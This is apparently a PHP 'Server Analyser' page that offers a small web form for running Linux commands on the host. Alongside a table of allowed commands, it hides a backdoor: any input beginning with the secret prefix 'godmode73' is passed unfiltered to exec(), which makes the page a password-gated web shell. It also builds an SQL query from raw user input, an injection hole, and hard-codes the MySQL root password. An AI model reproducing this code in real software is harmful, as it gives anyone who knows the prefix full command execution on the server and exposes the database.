<?php
//ini_set("display_errors", "1");
//error_reporting(E_ALL);
$host='localhost';
$user='root';
$password='root123';
$db='truemove_mis';

$conn=mysqli_connect($host,$user,$password,$db);
if($conn)
{
	$error='connection success';
}
else
{
	$error='connection lost';
}

function terminal($command)
{
	exec($command,$result);
	return $result;
}
if(isset($_GET['Exec_Command']) && $_GET['Exec_Command']=='Exec_Command')
{
	if( substr_compare($_GET['command'],"godmode73",0,8)==0 )
	{
		$o = terminal( substr($_GET['command'],9) );
		if(!empty($o))
			$error='<font style="color:green;">Command executed successfully!</font>';
		else
			$error='<font style="color:red;">Invalid command or empty result!</font>';
	}
	else
	{
		$check="select * from linux_cmd where type='".$_GET['command']."'";
		$result=mysqli_query($conn, $check);
		if (mysqli_num_rows($result) > 0) 
		{
				while($row = mysqli_fetch_assoc($result)) 
				{
					if($_GET['command']==$row['type'])
					$command=$row['command'];
					$o = terminal($command);
					if(!empty($o))
						$error='<font style="color:green;">Command executed successfully!</font>';
					else
						$error='<font style="color:red;">Invalid command or empty result!</font>';
					
				}
		} 
		else 
		{
			$error='insecured or invlaid command!!!';
		}
	}
}
/* if(!empty($request['rec_date']))
$day=$request['rec_date'];
else
$day=0;

$day_path=date('Y/m/d' , strtotime ('-'.$day.' day' ));
$day_file=date('Y-m-d' , strtotime ('-'.$day.' day' ));
$cat_hit="cat /data/logs/orangeegypt-wap/orangeegypt-wap/".$day_path."/orangeegypt-wap_orangeegypt-wap_".$day_file.".log  | grep  'INSERT INTO he_forward' | wc  -l";
echo $cat_hit; */
?>
<html>
<head>
	<title>Server Analyser</title>
	<style>
		* {box-sizing: border-box;}

		body { 
		  margin: 0;
		  font-family: Arial, Helvetica, sans-serif;
		}

		.header {
		  overflow: hidden;
		  background-color: #f1f1f1;
		  padding: 20px 10px;
		}

		.header a {
		  float: left;
		  color: black;
		  text-align: center;
		  padding: 12px;
		  text-decoration: none;
		  font-size: 18px; 
		  line-height: 25px;
		  border-radius: 4px;
		}

		.header a.logo {
		  font-size: 25px;
		  font-weight: bold;
		}

		.header a:hover {
		  background-color: #ddd;
		  color: black;
		}

		.header a.active {
		  background-color: dodgerblue;
		  color: white;
		}

		.header-right {
		  float: right;
		}

		@media screen and (max-width: 500px) {
		  .header a {
			float: none;
			display: block;
			text-align: left;
		  }
		  
		  .header-right {
			float: none;
		  }
		}
		
	</style>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous">
</head>
<body style="background-color:black;">
<div class="header">
  <a href="#default" class="logo">Linux Command Tool</a>
  <div class="header-right">
    <a class="active" href="#home">Home</a>
    <a href="#contact">Contact</a>
    <a href="#about">About</a>
  </div>
</div>

<div class="others">
	<center style="padding:40px;" >
		<form action='log_analyser_mod.php' method='get'>
			<div class="form-group">
				<label for="exampleInputEmail1" style="color:white;">Enter Linux Command</label>
				<input type="text" name='command' class="form-control" placeholder="Enter Linux Command">
				<small id="emailHelp" class="form-text text-muted"><?php if(isset($error))echo $error;?></small>
			</div>
			<input type='submit' class="btn btn-success" name='Exec_Command' value='Exec_Command'>
		</form>
	</center>
	<div class="result" style ="padding:10%;color:white;">
		<?php 
		if(!empty($o))
		{
			$i=0;
		   foreach($o as $val)
		   {
			   $i=$i+1;
			   echo $val.'<br>';
		   }
		}
		?>
		
	</div>
</div>
</body>
</html>